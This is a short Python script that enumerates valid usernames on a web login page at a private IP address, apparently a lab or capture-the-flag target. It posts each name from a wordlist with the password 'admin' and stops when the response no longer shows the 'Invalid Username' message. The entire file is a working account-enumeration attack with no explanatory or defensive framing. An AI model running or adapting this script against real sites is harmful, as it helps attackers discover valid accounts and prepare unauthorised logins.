import requests
import random

usernameList = "usernames.txt"
requestURL = 'http://192.168.59.192/login'

with open(usernameList, 'r') as f:
    names = [name.strip() for name in f.readlines() if name.strip()]

random.shuffle(names)

wrong = True
while wrong:
    for name in names:
        print("Trying username: {}".format(name))
        r = requests.post(requestURL, data={"username":name, "password":"admin"})
        if "<p class=is-warning>Invalid Username.</p>" not in r.text and 'Error processing request' not in r.text:
            wrong = False
            break

print("Found admin name:", name)
